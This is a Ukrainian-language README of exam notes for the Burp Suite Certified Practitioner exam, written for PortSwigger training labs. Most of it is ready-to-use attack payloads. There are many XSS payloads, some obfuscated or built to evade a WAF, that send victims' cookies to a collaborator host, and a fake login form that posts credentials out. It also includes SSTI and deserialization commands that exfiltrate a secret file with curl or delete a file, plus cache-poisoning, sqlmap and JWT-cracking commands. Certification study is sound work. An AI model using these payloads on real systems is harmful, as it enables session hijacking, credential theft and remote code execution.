# Burp-exam-notes

>Тут я викладу матеріали які можуть допомогти під час складання екзамену Burp Suite Certified Practitioner Exam. Частину із них я взяв [тут](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner), але як виявилось на практиці не всі вони були готові, деякі варто було допиляти, а деякі змінити, що забрало подекуди багато часу, з огляду на те, що сам екзамен триває 4 години. Тому дуже важливо мати усі ін'єкції робочі та перевірені, і не гаяти часу на їх виправлення під час самого екзамену.
>Корисні підказки для складання екзамену від [PortSwigger](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam)

----

**+eval**
```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//

``` 
>тут в base64 передається 
```
fetch("https://collaborator.oastify.com/?cookie="+btoa(document['cookie']))
```
**+eval URL encode**
>тут готова ін'єкція яка повертає відповідно на колаборатор кукі, просто передати script у exploit server
```
<script>
location="https://YOUR-LAB-ID.web-security-academy.net/?SearchTerm=%22%2Beval(atob(%22ZmV0Y2goImh0dHBzOi8vMmNmbTZlMmFpajVmZWQ3ZXl4ZTN3Mnc0dXYwbW9oYzYub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22))}%2F%2F"
</script>
```
**Function`X$**
>-Function`X$ тут у нас ін'єкція із використанням динамічних шаблонів, вміст всередині ${...} виконується під час виконання шаблону.
```
"-Function`X${'document.location="https://collaborator.oastify.com/"+document.cookie'}```-"
```
>адаптована версія із використанням Function`X$, лише передати script у exploit server для отримання cookies
```
<script>
location="https://YOUR-LAB-ID.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://collaborator.oastify.com/%22%2Bdocument.cookie'}```-%22"
</script>
```
**XSS+cookie**
```
<script>document.location='//collaborator.oastify.com/'+document.cookie</script>
```
```
"></select><script>document.location='http://collaborator.oastify.com/?cookie='+document.cookie</script>
```
```
\"-fetch('http://collaborator.oastify.com?c='+btoa(document.cookie))}//
```
```
<><img src=1 onerror="window.location='http://collaborator.oastify.com/c='+document.cookie">
```
```
<script>document.write('<img+src="http://collaborator.oastify.com?c='+document.cookie+'"+/>');</script>
```
```
</script><script>document.location="http://collaborator.oastify.com/?cookie="+document.cookie</script>
```
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=<body onload=document.location='https://collaborator.oastify.com/?cookie='+document.cookie tabindex=1>#x';
</script>
```
>готова ін'єкція для query параметру, якщо такий вразливий
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```
```
\';document.location=`http://collaborator.oastify.com/?cookie=`+document.cookie;//
```
>викликаємо XSS через id=x, якщо задати в посиланні #x
```
<xss id=x onfocus=document.location="http://collaborator.oastify.com/?cookie="+document.cookie tabindex=1>#x
```
>ULR Encoded:
```
%3Cxss%20id=x%20onfocus=document.location=%22http://collaborator.oastify.com/?cookie=%22+document.cookie%20tabindex=1%3E#x
```
>підбір tag та event (є така лабораторна робота у portswigger)
```
<svg><animatetransform onbegin=document.location='https://collaborator.oastify.com/?cookie='+document.cookie;>
```
>URL Encoded:
```
%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://collaborator.oastify.com/?cookie='+document.cookie;%3E
```
>викликаємо XSS через натискання жертвою кнопки x. Повний вигляд такий (для гарячої клавіші shift+X):
```
https://xxxxxx.net/?'accesskey='x'onclick='document.location="https://your-collaborator-url.com/?cookie="+document.cookie' 
```
**WAF**
>трохи спробуємо обійти WAF
```
</ScRiPt ><ScRiPt >document.write('<img src="http://collaborator.oastify.com?c='+document.cookie+'" />');</ScRiPt > 
```
>і передати його у ASCII (можна використовувати цей [сервіс](https://www.allmath.com/ascii-to-text.php), досить зручний)
```
</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```
```
"-alert(window["document"]["cookie"])-"
```
```
"-window["alert"](window["document"]["cookie"])-"
```
```
"-self["alert"](self["document"]["cookie"])-"
```
**Angular**
>тут у нас ін'єкція яка застосовується на сторінці із використанням AngularJS. 
constructor.constructor в Angular дає доступ до глобальної функції Function, яка дозволяє створювати і виконувати JavaScript-код у шаблоні. 
```
{{constructor.constructor('document.location="http://collaborator.oastify.com?c="+document.cookie')()}}
```
**XSS+input+cookie**
>ін'єкція для викрадення паролю і логіна користувача, який скористається формою для авторизації. Звісно, сторінка повинна мати вразливість до XSS.
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://collaborator.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
**Iframe**
>частково універсальні для exploit server
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:fetch(\'https://your-collaborator-url.com/\'+document.cookie)','*')">
</iframe>
```
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://your-collaborator-url.com?cookie=${document.cookie}`)>','*')">
</iframe>
```
**SSTI**
```
<%= system("curl https://your-collaborator-url.com/$(cat /home/carlos/secret)") %>
```
```
{{request.cookies.get('session')|urlize('https://your-collaborator-url.com/?cookie=')}}
```
**Web cache poisoning /js/geolocate.js**
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location%3d'https%3a//your-collaborator-url.oastify.com/%3fcookie%3d'%2bdocument.cookie%3b
```
----
**Deserialization**
>під руками повинні бути готові команди, із робочими шляхами де лежать у вас словники або команди які не потребують додаткових налаштувань чи втурчань, а лише зміни посилання на екзамен.
```
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar /path/to/file/ysoserial-all.jar CommonsCollections2 "curl https://collaborator.oastify.com -d@/home/carlos/secret" | gzip -c | base64 -w 0
```
```
/path/to/file/phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
**SQLMAP**
>тут шлях досить простий, копіюємо з Network із запиту на пошук "Copy as cURL", а далі лише забираємо curl і додаємо sqlmap -u.
>Зрештою, хто орієнтується із роботою sqlmap, вкурсі що до чого.
```
sqlmap -u 'cURL із Network' -p 'parametr' -batch --dbs --tables -T (тут вказати назву таблиці) --dump
```
**JWT**
```
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/Payload/ [jws_secret.txt](https://github.com/Zavada-Nazarii/burp-exam-notes/blob/main/jws_secret.txt) --force
```
>і ще така штука із docker є, це лаба "JWT authentication bypass via algorithm confusion with no exposed key"
Майте собі піднятий docker і готовий образ, щоб не виправляли під час екзамену трабли із бібліотеками системи.
```
docker run --rm -it portswigger/sig2n JWT_1 JWT_2
```

